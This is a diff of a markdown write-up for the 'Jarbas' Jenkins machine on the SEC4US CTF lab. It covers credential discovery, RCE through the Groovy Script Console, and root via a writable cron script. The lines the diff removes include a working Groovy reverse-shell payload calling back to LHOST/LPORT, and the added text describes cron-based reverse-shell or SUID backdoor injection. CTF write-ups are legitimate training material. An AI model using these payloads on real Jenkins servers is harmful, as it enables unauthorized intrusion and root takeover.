@@ -1,74 +1,64 @@
-# Maq156: Jarbas (Jenkins)
+# Maq156: Jarbas
 
-> **Platform:** SEC4US CTF Lab | **Category:** Web Hacking: Medium | **Points:** Dynamic
+Writeup for the **Jarbas** challenge on [SEC4US](https://sec4us.com.br/).
+
+> **Category:** Hacking: Medium
+> **Difficulty:** Medium
+
+---
 
 ## Overview
 
-A machine running Jenkins 2.113 with exposed credential hashes and a writable cron job for privilege escalation.
+A Jenkins server where credentials are discovered through web enumeration. The Jenkins Script Console accepts Groovy code for remote command execution, and a writable cron job provides the path to root.
 
----
+## Reconnaissance
 
-## Approach
+1. Scan the target to discover Jenkins (typically on port 8080) and other services.
+2. Enumerate the web server for hidden directories, files, and backup pages.
+3. Discover a page or file containing Jenkins credentials (e.g., an exposed HTML page with hashed or plaintext credentials).
+4. Crack any discovered hashes to obtain login credentials.
 
-**Technique:** Jenkins Exploitation + Cron Privesc
+## Exploitation
 
-### Reconnaissance
+1. Authenticate to Jenkins with the discovered credentials.
+2. Navigate to "Manage Jenkins" > "Script Console".
+3. Execute Groovy code to run OS commands on the underlying server.
+4. Use the Groovy Script Console to establish a reverse shell.
+5. Catch the reverse shell as the Jenkins service user.
 
-```bash
-nmap -sV -sC -p- <TARGET_IP> -oN nmap_full.txt
-```
+## Privilege Escalation
 
-Port scan reveals Apache (80) and Jenkins (8080).
+1. Enumerate scheduled tasks: `cat /etc/crontab` and `ls -la /etc/cron.*`.
+2. Identify a cron job running as root that references a writable script.
+3. Modify the cron script to inject a reverse shell or add a SUID backdoor.
+4. Wait for the cron job to execute with root privileges.
+5. Escalate to root and retrieve the flag.
 
-### Exploitation
-
-1. **Hash discovery:** An HTML page on port 80 contains MD5 hashes in the source code
-2. **Hash cracking:** Crack the MD5 hashes to obtain valid Jenkins credentials
-3. **Jenkins admin access:** Log in to Jenkins at port 8080 with the cracked credentials
-4. **Groovy Script Console RCE:** Use the Script Console (`/script`) to execute Groovy reverse shell code:
-   ```groovy
-   r = Runtime.getRuntime()
-   p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-   p.waitFor()
-   ```
-5. **Cron privesc:** Discover a cron job running as root that executes a world-writable cleanup script
-6. **Root shell:** Inject a reverse shell command into the cron script and wait for execution
-
-### Tools Used
-
-nmap, hashcat/john (MD5), Jenkins Script Console, netcat
-
----
-
-## Security Frameworks
+## Security Framework Mapping
 
 ### MITRE ATT&CK
 
-| Technique | Description |
-|-----------|-------------|
-| T1078 | Valid Accounts |
-| T1059.004 | Unix Shell |
-| T1053.003 | Cron |
+| Technique | ID |
+|-----------|----|
+| Unsecured Credentials: Credentials in Files | T1552.001 |
+| Command and Scripting Interpreter | T1059 |
+| Scheduled Task/Job: Cron | T1053.003 |
+| Valid Accounts | T1078 |
 
 ### CWE
 
-| ID | Description |
-|----|-------------|
-| CWE-916 | Use of Password Hash With Insufficient Effort |
-| CWE-732 | Incorrect Permission Assignment |
+- **CWE-312:** Cleartext Storage of Sensitive Information (exposed credentials)
+- **CWE-94:** Improper Control of Generation of Code (Groovy script execution)
+- **CWE-732:** Incorrect Permission Assignment for Critical Resource (writable cron script)
 
 ---
 
-## Author
+> "Jarbas, the butler, left the keys on the counter and the schedule on the fridge. A Script Console with valid credentials is not a feature; it is an open door. And a writable cron job? That is the welcome mat."
 
-**Andre Henrike** (@mrhenrike)
-
-Jenkins without authentication is not a CI/CD pipeline; it is a remote shell as a service. Thanks guys!! (❍ᴥ❍ʋ)
+```
+(❍ᴥ❍ʋ)
+```
 
 - Instagram: https://www.instagram.com/uniaogeek
 - LinkedIn: http://linkedin.com/in/mrhenrike
 - X: https://x.com/mrhenrike
-
----
-
-*For educational purposes only. Do not use any technique shown here against systems you do not own or have explicit permission to test.*
